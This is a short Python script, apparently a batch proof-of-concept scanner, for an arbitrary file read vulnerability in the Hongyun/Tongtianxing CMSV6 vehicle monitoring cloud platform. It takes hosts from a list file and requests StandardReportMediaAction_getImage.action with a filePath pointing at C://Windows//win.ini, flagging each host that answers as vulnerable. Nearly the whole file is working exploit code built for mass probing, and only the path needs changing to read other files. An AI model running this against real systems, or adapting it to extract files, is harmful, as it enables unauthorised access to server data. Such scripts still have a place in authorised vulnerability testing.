import argparse
import time
import requests

parser = argparse.ArgumentParser(description='鸿运(通天星CMSV6车载)主动安全监控云平台任意文件读取')
parser.add_argument('-f', help='Batch detection file name', type=str)
args = parser.parse_args()
file = args.f


def get_url(file):
    with open('{}'.format(file), 'r', encoding='utf-8') as f:
        for i in f:
            i = i.replace('\n', '')
            send_req("http://" + i)


def send_req(url_check):
    print('{} runing Check'.format(url_check))
    url = url_check + '/808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100'

    header = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept': '*/*',
        'Connection': 'Keep-Alive'
    }

    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=url, headers=header, timeout=3)
        if response.status_code == 200:
            print('存在鸿运(通天星CMSV6车载)主动安全监控云平台存在任意文件读取漏洞，请尽快修复漏洞！！！')

    except Exception as e:
        print(e)
        pass


if __name__ == '__main__':
    if file is None:
        print('请在当前目录下新建需要检测的url.txt')
    else:
        get_url(file)